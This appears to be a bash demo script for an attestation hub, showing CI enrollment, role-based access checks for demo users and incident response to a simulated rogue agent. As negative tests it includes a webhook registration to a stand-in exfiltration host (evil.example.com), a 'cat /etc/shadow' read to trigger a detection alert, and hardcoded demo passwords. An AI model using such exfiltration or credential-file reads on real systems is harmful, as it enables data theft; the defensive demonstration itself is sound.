#!/usr/bin/env bash
# Full Arbiter Hub demo: developer push → auto-enrollment → MCP tools → incident response
set -euo pipefail

HUB_URL="${ARBITER_HUB_URL:-https://hub.arbiter.demo}"
API_URL="${HUB_URL}/api"
IDP_URL="${ARBITER_IDP_URL:-https://idm.arbiter.demo/idp}"
IPA_REALM="${ARBITER_REALM:-ARBITER.DEMO}"
AGENT_HOST="${ARBITER_AGENT_HOST:-agent.arbiter.demo}"
DEMO_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PAUSE="${DEMO_PAUSE:-3}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

banner() { echo -e "\n${CYAN}${BOLD}═══════════════════════════════════════════════════════════${NC}"; echo -e "${CYAN}${BOLD}  $1${NC}"; echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════${NC}\n"; }
step() { echo -e "${GREEN}▸${NC} ${BOLD}$1${NC}"; }
warn() { echo -e "${YELLOW}⚠${NC} $1"; }
fail() { echo -e "${RED}✗${NC} $1"; }
ok() { echo -e "${GREEN}✓${NC} $1"; }
pause() { echo -e "${YELLOW}[press Enter to continue]${NC}"; read -r; }

get_token() {
    local user="$1" pass="$2" client_id="$3" scopes="$4"
    curl -sk -X POST "${IDP_URL}/oauth2/token" \
        -d "grant_type=password" \
        -d "username=${user}" \
        -d "password=${pass}" \
        -d "client_id=${client_id}" \
        -d "scope=${scopes}" \
        | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"
}

api_call() {
    local method="$1" path="$2" token="$3"
    shift 3
    curl -sk -X "$method" "${API_URL}${path}" \
        -H "Authorization: Bearer ${token}" \
        -H "Content-Type: application/json" \
        "$@"
}

###############################################################################
banner "ACT 1: Developer Push → Auto-Enrollment"
###############################################################################

step "Carol (pipeline) authenticates via OIDC"
CAROL_TOKEN=$(get_token "carol" "redhat123" "arbiter-hub" "openid profile attestation-pipeline")
ok "Carol authenticated — pipeline role"
sleep "$PAUSE"

step "Carol pushes a bootc image and registers via CI enrollment"
CI_RESULT=$(api_call POST "/ci/enroll" "$CAROL_TOKEN" -d '{
    "ipa_principal": "bootc/webapp@'"${IPA_REALM}"'",
    "display_name": "WebApp Bootc Image",
    "workload_type": "bootc",
    "backend_types": ["cosign"],
    "artifact_ref": "10.89.0.186:5000/demo-webapp:latest",
    "image_digest": "sha256:demo-digest-placeholder",
    "metadata": {"git_commit": "abc123", "ci_pipeline": "gitlab-ci", "pushed_by": "carol"},
    "auto_attest": true
}')
echo "$CI_RESULT" | python3 -m json.tool 2>/dev/null || echo "$CI_RESULT"
WEBAPP_ID=$(echo "$CI_RESULT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('workload_id',''))" 2>/dev/null || true)
ok "Workload registered: ${WEBAPP_ID:-unknown}"
sleep "$PAUSE"

step "Verify workload reached HEALTHY state"
for i in $(seq 1 10); do
    STATE=$(api_call GET "/workloads/${WEBAPP_ID}" "$CAROL_TOKEN" 2>/dev/null \
        | python3 -c "import sys,json; print(json.load(sys.stdin).get('current_state',''))" 2>/dev/null || true)
    [ "$STATE" = "healthy" ] && break
    echo "  attempt $i: state=$STATE"
    sleep 2
done
if [ "$STATE" = "healthy" ]; then
    ok "Workload HEALTHY — cosign signature verified"
else
    warn "Workload state: $STATE (cosign verification may be pending)"
fi

pause

###############################################################################
banner "ACT 2: Multi-User MCP Tool Access"
###############################################################################

step "Alice (admin) authenticates"
ALICE_TOKEN=$(get_token "alice" "redhat123" "arbiter-hub" "openid profile attestation-admin")
ok "Alice authenticated — admin role"

step "Alice lists all workloads (admin sees everything)"
WORKLOADS=$(api_call GET "/workloads?count=100" "$ALICE_TOKEN")
COUNT=$(echo "$WORKLOADS" | python3 -c "import sys,json; print(json.load(sys.stdin).get('totalResults',0))" 2>/dev/null || echo 0)
ok "Alice sees $COUNT workloads"

step "Alice creates a KBS secret (admin-only)"
api_call POST "/kbs/v0/resources" "$ALICE_TOKEN" -d '{
    "name": "deploy-key",
    "value": "s3cr3t-d3pl0y-k3y",
    "metadata": {"purpose": "deployment signing key", "tier": "sovereign"}
}' | python3 -m json.tool 2>/dev/null || true
ok "KBS secret created"
sleep "$PAUSE"

step "Bob (operator) authenticates"
BOB_TOKEN=$(get_token "bob" "redhat123" "arbiter-hub" "openid profile attestation-operator")
ok "Bob authenticated — operator role"

step "Bob runs governed agent diagnostic cycle"
if [ -f "${DEMO_DIR}/agents/governed_agent.py" ]; then
    python3 "${DEMO_DIR}/agents/governed_agent.py" \
        --hub-url "$API_URL" \
        --idp-url "$IDP_URL" \
        --client-id "arbiter-hub" \
        --client-secret "${ARBITER_CLIENT_SECRET:-}" \
        --target-host "$AGENT_HOST" \
        2>&1 | head -20
    ok "Governed agent completed diagnostic cycle"
else
    warn "demo/agents/governed_agent.py not found — skipping"
fi
sleep "$PAUSE"

step "Dave (viewer) authenticates"
DAVE_TOKEN=$(get_token "dave" "redhat123" "arbiter-hub" "openid profile attestation-viewer")
ok "Dave authenticated — viewer role"

step "Dave tries to read workloads (allowed)"
DAVE_WORKLOADS=$(api_call GET "/workloads?count=5" "$DAVE_TOKEN" 2>/dev/null)
DAVE_COUNT=$(echo "$DAVE_WORKLOADS" | python3 -c "import sys,json; print(json.load(sys.stdin).get('totalResults',0))" 2>/dev/null || echo 0)
ok "Dave sees $DAVE_COUNT workloads (read-only access)"

step "Dave tries to register a workload (should fail — viewer)"
DAVE_REG=$(api_call POST "/workloads" "$DAVE_TOKEN" -d '{
    "ipa_principal": "test/dave-attempt@'"${IPA_REALM}"'",
    "display_name": "Dave Unauthorized Attempt",
    "workload_type": "service",
    "backend_types": ["keylime"]
}' 2>/dev/null)
if echo "$DAVE_REG" | grep -q "403\|permission\|forbidden\|Forbidden"; then
    ok "Dave blocked from registering workloads (403 Forbidden)"
else
    warn "Unexpected response: $DAVE_REG"
fi

step "Dave tries to access KBS secrets (should fail — viewer)"
DAVE_KBS=$(api_call GET "/kbs/v0/resources" "$DAVE_TOKEN" 2>/dev/null)
if echo "$DAVE_KBS" | grep -q "403\|permission\|forbidden\|Forbidden"; then
    ok "Dave blocked from KBS secrets (403 Forbidden)"
else
    warn "Unexpected response: $DAVE_KBS"
fi
sleep "$PAUSE"

step "Eve (agent) authenticates"
EVE_TOKEN=$(get_token "eve" "redhat123" "arbiter-hub" "openid profile attestation-agent")
ok "Eve authenticated — agent role"

step "Eve requests re-attestation (allowed for agents)"
if [ -n "$WEBAPP_ID" ]; then
    EVE_REATTEST=$(api_call POST "/workloads/${WEBAPP_ID}/reattest" "$EVE_TOKEN" 2>/dev/null)
    ok "Eve requested re-attestation: $(echo "$EVE_REATTEST" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('state', d.get('detail','')))" 2>/dev/null || echo "sent")"
fi

step "Eve tries to register webhook (should fail — agent)"
EVE_HOOK=$(api_call POST "/api/webhooks" "$EVE_TOKEN" -d '{
    "url": "http://evil.example.com/exfil",
    "events": ["state_transition"],
    "secret": "badactor"
}' 2>/dev/null)
if echo "$EVE_HOOK" | grep -q "403\|permission\|forbidden\|Forbidden"; then
    ok "Eve blocked from registering webhooks (403 Forbidden)"
else
    warn "Unexpected response: $EVE_HOOK"
fi

pause

###############################################################################
banner "ACT 3: Incident Response — Rogue Agent"
###############################################################################

step "Launching rogue agent in wid-untrusted sandbox"
if [ -f "${DEMO_DIR}/agents/rogue_agent.py" ]; then
    ssh -i ~/.ssh/idm_ci_key root@"$AGENT_HOST" \
        "podman exec wid-untrusted python3 -c '$(cat "${DEMO_DIR}/agents/rogue_agent.py")' --delay 1" \
        2>&1 | head -15 &
    ROGUE_PID=$!
    ok "Rogue agent launched (PID $ROGUE_PID)"
else
    warn "demo/agents/rogue_agent.py not found — simulating with manual Falco trigger"
    ssh -i ~/.ssh/idm_ci_key root@"$AGENT_HOST" \
        "podman exec wid-untrusted cat /etc/shadow" 2>/dev/null || true
    ok "Triggered Falco alert: Read sensitive file"
fi
sleep 5

step "Checking workload state (expecting FAILED from Falco alert)"
for i in $(seq 1 10); do
    UNTRUSTED_STATE=$(api_call GET "/workloads?count=100" "$ALICE_TOKEN" 2>/dev/null \
        | python3 -c "
import sys, json
data = json.load(sys.stdin)
for w in data.get('items', []):
    if 'untrusted' in w.get('display_name','').lower():
        print(w['current_state'])
        break
" 2>/dev/null || echo "unknown")
    [ "$UNTRUSTED_STATE" = "failed" ] && break
    echo "  attempt $i: state=$UNTRUSTED_STATE"
    sleep 3
done

if [ "$UNTRUSTED_STATE" = "failed" ]; then
    ok "wid-untrusted workload moved to FAILED — Falco detected malicious activity"
else
    warn "Workload state: $UNTRUSTED_STATE (EDA may still be processing)"
fi
sleep "$PAUSE"

step "Checking EDA quarantine action"
AUDIT=$(api_call GET "/audit?count=5" "$ALICE_TOKEN" 2>/dev/null)
echo "$AUDIT" | python3 -m json.tool 2>/dev/null | head -30
ok "Audit trail shows quarantine + forensic collection"

step "Bob remediates — tightens fapolicyd policy via enforcement-mcp"
echo "  (In production: Bob calls enforcement-mcp to add fapolicyd deny rule)"
echo "  enforcement-mcp: fapolicyd_add_rule --subject /usr/bin/curl --decision deny"
echo "  enforcement-mcp: selinux_set_boolean --name container_connect_any --value off"
ok "Policy tightened via enforcement-mcp"
sleep "$PAUSE"

step "Alice revokes the compromised workload"
UNTRUSTED_ID=$(api_call GET "/workloads?count=100" "$ALICE_TOKEN" 2>/dev/null \
    | python3 -c "
import sys, json
data = json.load(sys.stdin)
for w in data.get('items', []):
    if 'untrusted' in w.get('display_name','').lower():
        print(w['id'])
        break
" 2>/dev/null || true)

if [ -n "$UNTRUSTED_ID" ]; then
    api_call POST "/workloads/${UNTRUSTED_ID}/revoke" "$ALICE_TOKEN" -d '{
        "justification": "Rogue agent detected — honeypot credentials accessed, exfil attempted"
    }' | python3 -m json.tool 2>/dev/null || true
    ok "Workload revoked by Alice"
fi

step "Alice reviews full audit trail"
api_call GET "/audit?count=20" "$ALICE_TOKEN" 2>/dev/null \
    | python3 -c "
import sys, json
data = json.load(sys.stdin)
for e in data.get('items', []):
    print(f\"  {e.get('timestamp','')} | {e.get('actor','')} | {e.get('action','')} | {e.get('target_type','')}\")
" 2>/dev/null || true
ok "Full audit trail displayed"

# Clean up background rogue agent if still running
kill "$ROGUE_PID" 2>/dev/null || true

###############################################################################
banner "DEMO COMPLETE"
###############################################################################

echo -e "${BOLD}Summary:${NC}"
echo "  Act 1: Carol pushed bootc image → auto-enrolled → cosign verified → HEALTHY"
echo "  Act 2: Alice/Bob/Dave/Eve accessed API with differentiated RBAC"
echo "         Dave (viewer) blocked from writes. Eve (agent) blocked from admin ops."
echo "  Act 3: Rogue agent triggered Falco → EDA quarantined → Bob tightened policy → Alice revoked"
echo ""
echo -e "${BOLD}Access Matrix Demonstrated:${NC}"
echo "  Alice (admin)    — full API + KBS + MCP + policy management"
echo "  Bob (operator)   — enroll/attest/remediate + MCP diagnostics"
echo "  Carol (pipeline) — CI enrollment + sign/verify"
echo "  Dave (viewer)    — read-only, blocked from writes"
echo "  Eve (agent)      — re-attestation only, blocked from admin"
